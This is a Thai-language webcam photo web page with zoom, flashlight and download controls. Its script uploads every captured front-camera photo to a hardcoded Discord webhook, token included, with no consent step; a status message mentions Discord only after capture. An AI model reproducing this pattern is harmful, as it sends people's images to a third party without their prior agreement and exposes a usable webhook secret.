<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ระบบถ่ายภาพด้วยกล้องเว็บ</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            color: #2c3e50;
        }
        .camera-container {
            position: relative;
            width: 100%;
            margin-bottom: 20px;
        }
        #video {
            width: 100%;
            border-radius: 8px;
            background-color: #000;
        }
        .controls {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
            justify-content: center;
        }
        button {
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        #capture-btn {
            background-color: #3498db;
            color: white;
        }
        #capture-btn:hover {
            background-color: #2980b9;
        }
        #download-btn {
            background-color: #2ecc71;
            color: white;
            display: none;
        }
        #download-btn:hover {
            background-color: #27ae60;
        }
        .toggle-btn {
            background-color: #95a5a6;
            color: white;
        }
        .toggle-btn:hover {
            background-color: #7f8c8d;
        }
        .toggle-btn.active {
            background-color: #e74c3c;
        }
        .zoom-control {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .zoom-control input {
            width: 150px;
        }
        .result {
            text-align: center;
            margin-top: 20px;
        }
        #canvas {
            display: none;
        }
        #photo {
            max-width: 100%;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            display: none;
        }
        .status {
            margin-top: 10px;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ระบบถ่ายภาพด้วยกล้องเว็บ</h1>
        
        <div class="camera-container">
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas"></canvas>
        </div>
        
        <div class="controls">
            <div class="zoom-control">
                <label for="zoom">ซูม:</label>
                <input type="range" id="zoom" min="1" max="3" step="0.1" value="1">
                <span id="zoom-value">1x</span>
            </div>
            
            <button id="flashlight-btn" class="toggle-btn">เปิดไฟฉาย</button>
            <button id="capture-btn">ถ่ายภาพ</button>
            <button id="download-btn">ดาวน์โหลดภาพ</button>
        </div>
        
        <div class="result">
            <img id="photo" alt="ภาพที่ถ่าย">
        </div>
        
        <div id="status" class="status"></div>
    </div>

    <script>
        // ตัวแปรสำหรับจัดการกล้อง
        let stream = null;
        let video = document.getElementById('video');
        let canvas = document.getElementById('canvas');
        let context = canvas.getContext('2d');
        let photo = document.getElementById('photo');
        let captureBtn = document.getElementById('capture-btn');
        let downloadBtn = document.getElementById('download-btn');
        let zoomSlider = document.getElementById('zoom');
        let zoomValue = document.getElementById('zoom-value');
        let flashlightBtn = document.getElementById('flashlight-btn');
        let statusDiv = document.getElementById('status');
        
        // ตัวแปรสำหรับติดตามสถานะ
        let isFlashlightOn = false;
        let currentImageData = null;
        
        // เริ่มต้นใช้งานกล้อง
        async function startCamera() {
            try {
                // ขออนุญาตใช้งานกล้อง
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user', // ใช้กล้องหน้า
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                updateStatus('กล้องพร้อมใช้งานแล้ว', 'success');
            } catch (error) {
                console.error('เกิดข้อผิดพลาดในการเข้าถึงกล้อง:', error);
                updateStatus('ไม่สามารถเข้าถึงกล้องได้: ' + error.message, 'error');
            }
        }
        
        // อัพเดทค่าซูม
        function updateZoom() {
            if (stream) {
                const track = stream.getVideoTracks()[0];
                const capabilities = track.getCapabilities();
                
                // ตรวจสอบว่ากล้องรองรับการซูมหรือไม่
                if (capabilities.zoom) {
                    const zoom = parseFloat(zoomSlider.value);
                    track.applyConstraints({
                        advanced: [{ zoom: zoom }]
                    });
                    zoomValue.textContent = zoom + 'x';
                }
            }
        }
        
        // ควบคุมไฟฉาย
        function toggleFlashlight() {
            if (stream) {
                const track = stream.getVideoTracks()[0];
                const capabilities = track.getCapabilities();
                
                // ตรวจสอบว่ากล้องรองรับไฟฉายหรือไม่
                if (capabilities.torch) {
                    isFlashlightOn = !isFlashlightOn;
                    
                    track.applyConstraints({
                        advanced: [{ torch: isFlashlightOn }]
                    }).then(() => {
                        flashlightBtn.textContent = isFlashlightOn ? 'ปิดไฟฉาย' : 'เปิดไฟฉาย';
                        flashlightBtn.classList.toggle('active', isFlashlightOn);
                    }).catch(error => {
                        console.error('ไม่สามารถควบคุมไฟฉายได้:', error);
                        updateStatus('กล้องของคุณไม่รองรับการควบคุมไฟฉาย', 'error');
                    });
                } else {
                    updateStatus('กล้องของคุณไม่รองรับการควบคุมไฟฉาย', 'error');
                }
            }
        }
        
        // ถ่ายภาพ
        function capturePhoto() {
            // ตั้งค่าขนาดของ canvas ให้เท่ากับวิดีโอ
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // วาดภาพจากวิดีโอลงใน canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // แสดงภาพที่ถ่าย
            photo.src = canvas.toDataURL('image/png');
            photo.style.display = 'block';
            
            // แสดงปุ่มดาวน์โหลด
            downloadBtn.style.display = 'inline-block';
            
            // บันทึกข้อมูลภาพสำหรับการดาวน์โหลด
            currentImageData = canvas.toDataURL('image/png');
            
            // อัพโหลดภาพไปยัง Discord
            uploadToDiscord();
            
            updateStatus('ถ่ายภาพสำเร็จ! กำลังอัพโหลดไปยัง Discord...', 'success');
        }
        
        // ดาวน์โหลดภาพ
        function downloadPhoto() {
            if (currentImageData) {
                const link = document.createElement('a');
                link.download = 'photo_' + new Date().getTime() + '.png';
                link.href = currentImageData;
                link.click();
            }
        }
        
        // อัพโหลดภาพไปยัง Discord
        async function uploadToDiscord() {
            try {
                // แปลงข้อมูลภาพเป็น blob
                const response = await fetch(currentImageData);
                const blob = await response.blob();
                
                // สร้าง FormData สำหรับส่งไฟล์
                const formData = new FormData();
                formData.append('file', blob, 'photo.png');
                
                // ข้อมูลเพิ่มเติม (ถ้ามี)
                const payload = {
                    content: 'ภาพจากระบบถ่ายภาพด้วยกล้องเว็บ - ' + new Date().toLocaleString('th-TH'),
                    username: 'Camera App'
                };
                
                formData.append('payload_json', JSON.stringify(payload));
                
                // ส่งไปยัง Discord Webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1427996899654242356/XOaNSAiNwWRYaXCLAQ3RkFNTOTxOzsVHVMyoh-DgWHnTJYAHpXNRk8cz1HenwMBYYA9h';
                
                const uploadResponse = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });
                
                if (uploadResponse.ok) {
                    updateStatus('อัพโหลดภาพไปยัง Discord สำเร็จ!', 'success');
                } else {
                    throw new Error('การอัพโหลดล้มเหลว: ' + uploadResponse.status);
                }
            } catch (error) {
                console.error('เกิดข้อผิดพลาดในการอัพโหลด:', error);
                updateStatus('ไม่สามารถอัพโหลดภาพได้: ' + error.message, 'error');
            }
        }
        
        // อัพเดทสถานะ
        function updateStatus(message, type) {
            statusDiv.textContent = message;
            statusDiv.className = 'status ' + type;
        }
        
        // ตั้งค่า event listeners
        zoomSlider.addEventListener('input', updateZoom);
        flashlightBtn.addEventListener('click', toggleFlashlight);
        captureBtn.addEventListener('click', capturePhoto);
        downloadBtn.addEventListener('click', downloadPhoto);
        
        // เริ่มต้นใช้งาน
        startCamera();
    </script>
</body>
</html>
